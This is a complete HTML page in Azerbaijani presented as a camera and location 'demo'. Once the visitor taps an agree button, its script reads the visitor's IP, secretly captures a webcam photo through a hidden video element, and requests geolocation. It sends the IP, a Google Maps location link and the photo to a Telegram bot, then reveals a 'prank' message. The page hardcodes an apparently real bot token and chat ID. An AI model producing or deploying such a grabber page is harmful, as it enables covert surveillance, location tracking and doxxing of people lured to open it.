<!DOCTYPE html>
<html lang="az">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Camera & Location Demo</title>

<style>
body{
    background:#111;
    color:white;
    font-family:Arial;
    display:flex;
    flex-direction:column;
    justify-content:center;
    align-items:center;
    height:100vh;
    margin:0;
    text-align:center;
}

button{
    padding:14px 24px;
    border:none;
    border-radius:10px;
    background:#00ff99;
    color:black;
    font-size:16px;
    cursor:pointer;
}

video{
    display:none;
}

#status{
    margin-top:20px;
    max-width:90%;
}
</style>
</head>
<body>

<h2>Demo Kamera Sistemi</h2>

<p>
Bu demo:
<br>
• Kamera şəkli çəkəcək
<br>
• Təxmini IP məlumatını alacaq
<br>
• Konum icazəsi istəyəcək
<br>
• Məlumatları Telegram botuna göndərəcək
</p>

<button onclick="start()">Razıyam</button>

<div id="status"></div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>

const BOT_TOKEN = "8744224588:AAHxq0n_-gG2RhbitOuefZKnxZITTwFMWMY";
const CHAT_ID = "6234777001";

const statusBox = document.getElementById("status");
const video = document.getElementById("video");

async function sendTelegram(text){

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
        method:"POST",
        headers:{
            "Content-Type":"application/json"
        },
        body:JSON.stringify({
            chat_id:CHAT_ID,
            text:text
        })
    });

}

async function start(){

    statusBox.innerText = "İcazələr alınır...";

    try{

        // IP məlumatı
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();

        // Kamera
        const stream = await navigator.mediaDevices.getUserMedia({
            video:true
        });

        video.srcObject = stream;

        // Konum
        navigator.geolocation.getCurrentPosition(async(pos)=>{

            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;

            await sendTelegram(
                `Yeni giriş

IP: ${ipData.ip}

Konum:
https://maps.google.com/?q=${lat},${lon}`
            );

            takePhoto();

        }, async()=>{

            await sendTelegram(
                `Yeni giriş

IP: ${ipData.ip}

Konum icazəsi verilmədi`
            );

            takePhoto();

        });

    }catch(err){

        statusBox.innerText = "İcazə verilmədi";

    }

}

function takePhoto(){

    setTimeout(async()=>{

        const canvas = document.getElementById("canvas");

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        const ctx = canvas.getContext("2d");

        ctx.drawImage(video,0,0);

        canvas.toBlob(async(blob)=>{

            const formData = new FormData();

            formData.append("chat_id", CHAT_ID);
            formData.append("photo", blob, "photo.png");

            await fetch(
                `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
                {
                    method:"POST",
                    body:formData
                }
            );

            document.body.innerHTML = `
                <h1>😂 PRANK OLDU</h1>
                <p>Demo uğurla tamamlandı 😄</p>
            `;

        },"image/png");

    },2000);

}

</script>

</body>
</html>
